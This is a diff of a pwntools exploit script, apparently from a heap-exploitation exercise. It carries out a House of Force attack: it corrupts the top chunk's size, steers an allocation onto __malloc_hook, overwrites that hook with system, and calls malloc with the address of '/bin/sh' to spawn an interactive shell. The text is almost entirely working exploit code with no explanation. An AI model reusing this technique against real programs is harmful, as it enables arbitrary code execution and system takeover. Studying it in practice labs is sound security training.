@@ -56,8 +56,12 @@ info(f"target: 0x{elf.sym.target:02x}")
 # =============================================================================
 
 malloc(24, b'Y'*24 + p64(0xffffffffffffffff))
-space = delta(heap + 0x20, elf.sym.target - 0x20)
-malloc(space, b'A')
-malloc(24, b'Hello!!')
+# space = delta(heap + 0x20, elf.sym.target - 0x20
+space = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
+malloc(space, b'/bin/sh\0')
+malloc(24, p64(libc.sym.system))
+# cmd = heap + 0x30
+cmd = next(libc.search(b"/bin/sh"))
+malloc(cmd, "")
 
 io.interactive()
